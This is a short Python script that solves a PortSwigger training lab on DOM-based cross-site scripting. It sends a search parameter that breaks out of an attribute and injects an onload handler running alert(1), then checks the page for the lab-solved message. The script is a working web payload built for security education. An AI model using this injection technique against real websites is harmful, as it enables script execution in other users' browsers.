# PortSwigger Lab : DOM_XSS_in_document.write_sink_using_source_location.search

import requests
from bs4 import BeautifulSoup
import urllib3
import sys
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'127.0.0.1:8080', 'https':'127.0.0.1:8080'}

def main():
    print("[+] Starting the Exploit...")

    try :
        host = sys.argv[1].strip().rstrip('/')
    except IndexError :
        print(f"usage: {sys.argv[0]} <HOST>")
        print(f"Example: {sys.argv[0]} www.example.com")
        sys.exit(-1)

    client = requests.Session()
    client.verify = False
    client.proxies = proxies

    url = f'{host}/?search=Hello" onload="alert(1)'
    client.get(url)

    if 'Congratulations, you solved the lab!' not in client.get(host).text:
        print("Failed to solve")
        sys.exit(-1)

    print("Lab Solved")

if __name__ == "__main__":
    main()
